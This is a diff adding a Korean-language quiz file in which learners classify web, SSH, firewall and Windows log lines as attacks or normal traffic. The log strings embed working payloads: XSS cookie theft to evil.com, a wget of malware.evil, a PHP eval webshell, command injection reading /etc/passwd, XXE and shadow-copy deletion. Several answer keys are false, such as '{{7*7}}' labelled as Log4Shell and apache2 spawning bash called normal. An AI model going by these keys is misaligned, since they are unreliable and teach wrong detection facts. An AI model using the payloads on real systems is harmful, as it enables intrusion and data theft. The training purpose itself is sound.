@@ -1,0 +1,275 @@
+[
+  {
+    "log": "192.168.1.100 - - [10/Oct/2023:14:23:45 +0900] \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 200 1024",
+    "choices": ["XSS 공격", "SQL 인젝션", "정상 트래픽"],
+    "answerIndex": 0,
+    "explain": "쿼리 파라미터 q에 <script> 태그가 포함되어 있어 클라이언트 측 스크립트 실행 시도.",
+    "level": 1
+  },
+  {
+    "log": "Oct 10 14:25:33 webserver sshd[12345]: Failed password for root from 203.0.113.45 port 52341 ssh2",
+    "choices": ["무차별 대입 공격", "크리덴셜 스터핑", "정상 로그인 시도"],
+    "answerIndex": 0,
+    "explain": "root 계정에 대한 반복적인 실패한 비밀번호 로그인 시도가 관찰됨.",
+    "level": 1
+  },
+  {
+    "log": "192.168.10.50 - - [10/Oct/2023:15:01:12 +0900] \"GET /../../../etc/passwd HTTP/1.1\" 400 389",
+    "choices": ["경로 탐색 공격", "디렉터리 스캐닝", "SQL 인젝션"],
+    "answerIndex": 0,
+    "explain": "/../../../ 경로를 통해 루트 디렉터리 접근 시도로 경로 탐색 공격 특징.",
+    "level": 1
+  },
+  {
+    "log": "2023-10-10T14:30:22Z 10.0.0.25 - - GET /wp-admin/admin-ajax.php - 443 - 198.51.100.12 Mozilla/5.0 200 0 0 12",
+    "choices": ["웹셸 업로드 시도", "정상 웹 요청", "XSS 공격"],
+    "answerIndex": 0,
+    "explain": "wp-admin 경로 접근 후 0 바이트 응답은 웹셸 실행 후 즉시 종료된 특징.",
+    "level": 1
+  },
+  {
+    "log": "Oct 10 14:35:11 dbserver sshd[9876]: Accepted password for admin from 10.0.0.5 port 49152 ssh2",
+    "choices": ["정상 로그인", "무차별 대입 공격", "크리덴셜 스터핑"],
+    "answerIndex": 0,
+    "explain": "성공적인 로그인 기록이며, 정상적인 사설망 사용자 접근.",
+    "level": 1
+  },
+  {
+    "log": "192.168.1.200 - - [10/Oct/2023:15:10:33 +0900] \"POST /api/login HTTP/1.1\" 401 156 \"user=admin&pass=admin\" 198.51.100.7",
+    "choices": ["크리덴셜 스터핑", "SQL 인젝션", "XSS 공격"],
+    "answerIndex": 0,
+    "explain": "일반적으로 알려진 기본 ID/PW 조합 반복 시도로 크리덴셜 스터핑 특징.",
+    "level": 1
+  },
+  {
+    "log": "2023-10-10T14:40:05Z 10.0.0.100 - - GET /shell.php?cmd=whoami - 443 - 192.0.2.50 Mozilla/5.0 200 123 0 5",
+    "choices": ["웹셸 실행", "SQL 인젝션", "정상 API 요청"],
+    "answerIndex": 0,
+    "explain": "cmd 파라미터로 OS 명령 실행 시도하며 shell.php 파일 접근으로 웹셸 실행 징후.",
+    "level": 1
+  },
+  {
+    "log": "Oct 10 14:45:22 firewall kernel: DROP IN=eth0 OUT= SRC=203.0.113.80 DST=192.168.1.5 PROTO=TCP DPT=22 SYN",
+    "choices": ["포트 스캔", "정상 SSH 연결", "무차별 대입 공격"],
+    "answerIndex": 0,
+    "explain": "SYN 패킷만 전송되고 연결이 완료되지 않아 포트 스캔 특징.",
+    "level": 1
+  },
+  {
+    "log": "192.168.1.10 - - [10/Oct/2023:15:20:01 +0900] \"GET /login HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+    "choices": ["정상 트래픽", "XSS 공격", "SQL 인젝션"],
+    "answerIndex": 0,
+    "explain": "일반적인 웹 페이지 접근이며 특이한 파라미터나 페이로드 없음.",
+    "level": 1
+  },
+  {
+    "log": "Oct 10 14:55:44 webserver sshd[5678]: Failed password for invalid user test from 198.51.100.200 port 55123 ssh2",
+    "choices": ["무차별 대입 공격", "크리덴셜 스터핑", "정상 로그인"],
+    "answerIndex": 0,
+    "explain": "존재하지 않는 사용자(test)에 대한 로그인 실패 반복은 무차별 대입 공격.",
+    "level": 1
+  },
+  {
+    "log": "2023-10-10T15:00:15Z 10.0.0.30 - - GET /api/data?id=1 OR 1=1-- - 443 - 203.0.113.15 Mozilla/5.0 500 0 0 2",
+    "choices": ["SQL 인젝션", "XSS 공격", "정상 API 요청"],
+    "answerIndex": 0,
+    "explain": "id 파라미터에 OR 1=1-- 페이로드가 포함되어 있어 SQL 인젝션 시도.",
+    "level": 1
+  },
+  {
+    "log": "2023-10-10T15:05:28Z 192.168.1.50 - - POST /upload HTTP/1.1 200 12 \"file=shell.php&content=<?php eval($_GET[c]); ?>\" 198.51.100.99",
+    "choices": ["웹셸 업로드", "SQL 인젝션", "정상 파일 업로드"],
+    "answerIndex": 0,
+    "explain": "PHP eval 코드가 포함된 파일 업로드 시도로 웹셸 업로드 징후.",
+    "level": 1
+  },
+  {
+    "log": "Oct 10 15:10:33 proxy.log: 192.168.1.25 CONNECT api.malware-c2.net:443 HTTP/1.1 200 - -",
+    "choices": ["C2 비콘", "정상 HTTPS 요청", "DNS 터널링"],
+    "answerIndex": 0,
+    "explain": "의심스러운 도메인 api.malware-c2.net으로의 CONNECT 요청은 C2 통신.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T15:15:44Z EventCode=4625 AccountName: Administrator AccountDomain: CORP LogonType: 3 FailureCode: 0xC000006D",
+    "choices": ["무차별 대입 공격", "크리덴셜 스터핑", "정상 로그인"],
+    "answerIndex": 0,
+    "explain": "Windows 보안 이벤트 ID 4625로 로그인 실패, 반복 시도 시 무차별 대입.",
+    "level": 2
+  },
+  {
+    "log": "192.168.1.100 - - [10/Oct/2023:15:20:55 +0900] \"GET /page?input={{7*7}} HTTP/1.1\" 200 2048",
+    "choices": ["Log4Shell 공격", "SQL 인젝션", "정상 요청"],
+    "answerIndex": 0,
+    "explain": "{{7*7}} 표현식은 Log4Shell 취약점(CVE-2021-44228)의 페이로드로 확인 가능.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T15:25:12Z SRC=198.51.100.55 DST=192.168.1.10 PROTO=UDP SPT=12345 DPT=53 LEN=64 T=txt data=cmd.exe /c wget.exe http://malware.evil/file.exe",
+    "choices": ["DNS 터널링", "정상 DNS 쿼리", "XXE 공격"],
+    "answerIndex": 0,
+    "explain": "TXT 레코드에 OS 명령어가 포함된 DNS 쿼리는 DNS 터널링 특징.",
+    "level": 2
+  },
+  {
+    "log": "Oct 10 15:30:22 sshd[4321]: Accepted publickey for developer from 10.0.0.15 port 52410 ssh2",
+    "choices": ["정상 로그인", "무차별 대입 공격", "크리덴셜 스터핑"],
+    "answerIndex": 0,
+    "explain": "공개키 인증 방식의 성공 로그인으로 정상적인 사설망 SSH 접근.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T15:35:33Z EventCode=4688 CommandLine: \"cmd.exe /c vssadmin delete shadows /all /quiet\"",
+    "choices": ["랜섬웨어 전조", "권한 상승", "정상 시스템 명령"],
+    "answerIndex": 0,
+    "explain": "vssadmin delete shadows 명령은 백업 복사본 삭제를 위한 랜섬웨어 전조 행동.",
+    "level": 2
+  },
+  {
+    "log": "192.168.1.20 - - [10/Oct/2023:15:40:44 +0900] \"GET /admin/ HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0\"",
+    "choices": ["디렉터리 스캐닝", "XSS 공격", "정상 요청"],
+    "answerIndex": 0,
+    "explain": "일반 사용자가 접근하지 않을 법한 /admin/ 경로 탐색은 디렉터리 스캐닝.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T15:45:55Z 10.0.0.45 - - GET /proxy.php?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1 200 1024 198.51.100.33",
+    "choices": ["SSRF 공격", "SQL 인젝션", "정상 요청"],
+    "answerIndex": 0,
+    "explain": "169.254.169.254는 클라우드 메타데이터 서비스 주소로 SSRF 공격 특징.",
+    "level": 2
+  },
+  {
+    "log": "Oct 10 15:50:06 auth.log: user=ldapuser, cmd=/usr/bin/passwd, ppid=1234, exe=/bin/bash",
+    "choices": ["권한 상승", "정상 사용자 명령", "OS 명령 주입"],
+    "answerIndex": 0,
+    "explain": "일반 사용자가 passwd 명령을 직접 실행하려는 시도는 권한 상승 시도.",
+    "level": 2
+  },
+  {
+    "log": "192.168.1.30 - - [10/Oct/2023:15:55:17 +0900] \"POST /api/upload HTTP/1.1\" 200 512 \"Content-Type: application/xml <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>\"",
+    "choices": ["XXE 공격", "SQL 인젝션", "정상 XML 요청"],
+    "answerIndex": 0,
+    "explain": "XML 내부 DTD에 file:// 로컬 파일 읽기 요청이 포함되어 XXE 공격.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T16:00:28Z 192.168.1.40 - - GET /search?q=SELECT * FROM users WHERE 1=1 HTTP/1.1 200 1024",
+    "choices": ["SQL 인젝션", "XSS 공격", "정상 검색 요청"],
+    "answerIndex": 0,
+    "explain": "쿼리 파라미터에 SQL 문장이 포함되어 있어 SQL 인젝션 시도.",
+    "level": 2
+  },
+  {
+    "log": "Oct 10 16:05:39 sshd[7890]: Failed password for root from 203.0.113.22 port 49876 ssh2, 203.0.113.22 port 49877 ssh2, 203.0.113.22 port 49878 ssh2",
+    "choices": ["무차별 대입 공격", "정상 로그인", "크리덴셜 스터핑"],
+    "answerIndex": 0,
+    "explain": "단일 IP에서 root 계정으로 연속된 SSH 로그인 실패는 무차별 대입 공격.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T16:10:50Z 10.0.0.60 - - GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1 200 512 \"-\" \"WPScan v3.8.22\"",
+    "choices": ["디렉터리 스캐닝", "정상 웹 요청", "XSS 공격"],
+    "answerIndex": 0,
+    "explain": "WPScan 도구가 wp-file-manager 플러그인 정보 탐색 중이며 디렉터리 스캐닝.",
+    "level": 2
+  },
+  {
+    "log": "Oct 10 16:15:01 auth.log: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.10 user=admin",
+    "choices": ["크리덴셜 스터핑", "무차별 대입 공격", "정상 로그인"],
+    "answerIndex": 0,
+    "explain": "PAM 로그인 실패 기록이며, 외부 IP에서 반복 시도는 크리덴셜 스터핑.",
+    "level": 2
+  },
+  {
+    "log": "192.168.1.55 - - [10/Oct/2023:16:20:12 +0900] \"GET /shell.php HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0\"",
+    "choices": ["웹셸 탐색", "정상 요청", "SQL 인젝션"],
+    "answerIndex": 0,
+    "explain": "shell.php 파일 직접 접근은 웹셸 존재 여부 탐색 시도.",
+    "level": 2
+  },
+  {
+    "log": "2023-10-10T16:25:23Z EventCode=4672 SpecialGroups: SeAssignPrimaryTokenPrivilege, SeTcbPrivilege AccountName: SYSTEM",
+    "choices": ["정상 시스템 로그인", "권한 상승", "C2 비콘"],
+    "answerIndex": 0,
+    "explain": "SYSTEM 계정이 특권 할당을 받는 것은 정상 시스템 동작.",
+    "level": 3
+  },
+  {
+    "log": "192.168.1.100 - - [10/Oct/2023:16:30:34 +0900] \"GET /page?name=admin' AND 1=1-- HTTP/1.1\" 200 4096",
+    "choices": ["SQL 인젝션", "XSS 공격", "정상 요청"],
+    "answerIndex": 0,
+    "explain": "admin' AND 1=1-- 페이로드는 SQL 인젝션의 대표적 유형.",
+    "level": 3
+  },
+  {
+    "log": "Oct 10 16:35:45 syslog: kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP DPT=3389",
+    "choices": ["RDP 무차별 대입", "정상 RDP 요청", "포트 스캔"],
+    "answerIndex": 0,
+    "explain": "3389 포트(RDP)로의 외부 차단 요청은 무차별 대입 공격 시도.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T16:40:56Z 10.0.0.70 - - GET /api/v1/users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 500 256",
+    "choices": ["SQL 인젝션", "정상 API 요청", "XSS 공격"],
+    "answerIndex": 0,
+    "explain": "UNION SELECT 페이로드는 테이블 스키마 추출을 위한 SQL 인젝션.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T16:45:07Z SRC=198.51.100.44 DST=192.168.1.5 PROTO=TCP DPT=22 SYN SEQ=1234567890 ACK=0",
+    "choices": ["포트 스캔", "무차별 대입 공격", "정상 SSH 연결"],
+    "answerIndex": 0,
+    "explain": "SYN 패킷만 전송되고 연결되지 않아 포트 스캔 특징.",
+    "level": 3
+  },
+  {
+    "log": "Oct 10 16:50:18 auth.log: pam_unix(sshd:auth): conversation error; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.99 user=test",
+    "choices": ["크리덴셜 스터핑", "정상 로그인", "무차별 대입 공격"],
+    "answerIndex": 0,
+    "explain": "PAM 대화 오류는 자동화된 크리덴셜 스터핑 도구에서 흔히 발생.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T16:55:29Z 192.168.1.80 - - GET /admin/.git/config HTTP/1.1 200 128 \"-\" \"git/2.30.0\"",
+    "choices": ["정상 요청", "소스 코드 유출 시도", "정상 Git 요청"],
+    "answerIndex": 1,
+    "explain": "/.git/config 접근은 개발자 환경에서 흔하지 않으며 소스 유출 시도.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T17:00:40Z EventCode=4624 AccountName: SYSTEM AccountDomain: NT AUTHORITY LogonType: 5",
+    "choices": ["정상 시스템 로그인", "권한 상승", "C2 비콘"],
+    "answerIndex": 0,
+    "explain": "LogonType 5는 서비스 계정으로의 로그인으로 정상적인 Windows 동작.",
+    "level": 3
+  },
+  {
+    "log": "192.168.1.90 - - [10/Oct/2023:17:05:51 +0900] \"GET /api?callback=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1\" 200 512",
+    "choices": ["XSS 공격", "SQL 인젝션", "정상 요청"],
+    "answerIndex": 0,
+    "explain": "document.cookie를 외부 도메인으로 전송하는 스크립트는 XSS 기반 세션 탈취.",
+    "level": 3
+  },
+  {
+    "log": "Oct 10 17:10:02 auth.log: user=www-data, cmd=/bin/bash, ppid=8765, exe=/usr/sbin/apache2",
+    "choices": ["권한 상승", "정상 웹서버 실행", "OS 명령 주입"],
+    "answerIndex": 1,
+    "explain": "apache2 프로세스가 /bin/bash 실행은 정상적인 웹서버 동작.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T17:15:13Z 10.0.0.80 - - GET /ping?host=google.com|cat /etc/passwd HTTP/1.1 200 128",
+    "choices": ["OS 명령 주입", "SQL 인젝션", "정상 Ping 요청"],
+    "answerIndex": 0,
+    "explain": "host 파라미터에 |cat /etc/passwd가 포함되어 있어 OS 명령 주입.",
+    "level": 3
+  },
+  {
+    "log": "2023-10-10T17:20:24Z 192.168.1.105 - - GET / HTTP/1.1 200 4096 \"-\" \"Mozilla/5.0 (compatible; Googlebot/2.1)\"",
+    "choices": ["정상 크롤러", "웹셸 탐색", "정상 사용자 요청"],
+    "answerIndex": 0,
+    "explain": "Googlebot User-Agent로 인한 정상적인 검색엔진 크롤링.",
+    "level": 3
+  }
+]
